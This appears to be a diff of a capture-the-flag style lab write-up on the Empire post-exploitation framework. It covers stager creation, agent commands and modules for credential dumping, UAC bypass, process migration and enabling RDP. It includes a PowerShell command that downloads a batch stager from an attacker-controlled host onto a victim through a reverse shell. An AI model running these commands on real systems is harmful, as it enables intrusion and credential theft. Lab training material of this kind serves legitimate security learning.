@@ -163,24 +163,26 @@ This section is to learn more about stagers and how to work with them. I am prov
 
 #### 1 — First, type the command ‘usestager’ and double-tap tab to view all options we have for stagers. Which option allows us to use a batch file?
 
-Answer : ```windows/launcher_bat```
+Answer : ``windows/launcher_bat``
 
 #### 2 — Let’s finish our previous command and select the batch file option. Press enter to finalize this. What is our new path to the ‘module’ we have selected?
 
-Answer : ```stager/windows/launcher_bat```
+Answer : ``stager/windows/launcher_bat``
 
 #### 3 — Since we’ve previously set our listener to use http, we must now set the associated options within our stager we are building to match that. What option must we set in order to accomplish this?
 
-Answer : ```Listener```
+Answer : ``Listener``
 
 #### 4 — Type execute to finish creating our stager. Where is the stager saved?
 
-Answer : ```/tmp/launcher.bat```
+Answer : ``/tmp/launcher.bat``
 
 After that I simply cp the launcher bat to the webserver we made with the Empire framework.
 
 ```
+
 cp /tmp/launcher.bat /var/www/html/launcher.bat.
+
 ```
 
 Why i did that? I did that to prepare the ground for the #5 part.
@@ -188,11 +190,13 @@ Why i did that? I did that to prepare the ground for the #5 part.
 #### 5 — Using any shell you have previously gained into our victim system transport the stager batch file to the system and execute it. This can be done in numerous ways depending on the stager used, be prepared to be flexible with your transportation methods similarly to how you might handle an msfvenom package.
 
 Answer : 
-```While i had my reverse shell open inside the target machine i needed to transfer the file { launcher.bat } inside the windows machine. So i did it with the Powershell.```
+``While i had my reverse shell open inside the target machine i needed to transfer the file { launcher.bat } inside the windows machine. So i did it with the Powershell.``
 
 ```
+
 powershell -c “(new-object System.Net.WebClient).DownloadFile(‘http://{your_machine_ip}:
 {your_port}/launcher.bat','C:\\Users\\Jon\\Documents\\launcher.bat')"
+
 ```
 
 That was a little bit hard to work as i tried a lot of ways until something worked eventually.
@@ -207,47 +211,47 @@ Most of these answers where from help command inside the Empire Framework and al
 
 #### 3 — What command do we use to interact with an agent?
 
-Answer : ```interact```
+Answer : ``interact``
 
 #### 4 — What about if we wanted to list any usernames and passwords we have gathered?
 
-Answer : ```creds```
+Answer : ``creds``
 
 #### 5 — And if we wanted to ‘deactivate’ an agent for a while to avoid detection?
 
-Answer : ```sleep```
+Answer : ``sleep``
 
 #### 6 — How about if we wanted to delete an agent or disconnect it?
 
-Answer : ```kill```
+Answer : ``kill``
 
 #### 7 — Moving into the post exploitation modules, what command can we use to search through these?
 
-Answer : ```searchmodule```
+Answer : ``searchmodule``
 
 #### 8 — We’ll start with the most important module, find the module which plays a specific AC/DC song.
 
-Answer : ```python/trollsploit/osx/thunderstruck```
+Answer : ``python/trollsploit/osx/thunderstruck``
 
 #### 9 — What if we wanted to perform an lsa dump with a certain popular windows credential gathering tool?
 
-Answer : ```powershell/credentials/mimikatz/lsadump```
+Answer : ``powershell/credentials/mimikatz/lsadump``
 
 #### 10 — Sometime we might not have the permissions level that we require to perform further actions, what module set might we have to use to get around UAC?
 
-Answer : ```bypassuac```
+Answer : ``bypassuac``
 
 #### 11 — What module family allows us to gather additional information about the network we are on?
 
-Answer : ```recon```
+Answer : ``recon``
 
 #### 12 — Our process we have compromised might not be the most stable, how do we migrate to another process? (This will have a specific module answer)
 
-Answer : ```powershell/management/psinject```
+Answer : ``powershell/management/psinject``
 
 #### 13 — Last but not least, what module can we use to turn on remote desktop access for our purposes?
 
-Answer : ```powershell/management/enable_rdp```
+Answer : ``powershell/management/enable_rdp``
 
 Thank you very much for reading.
 
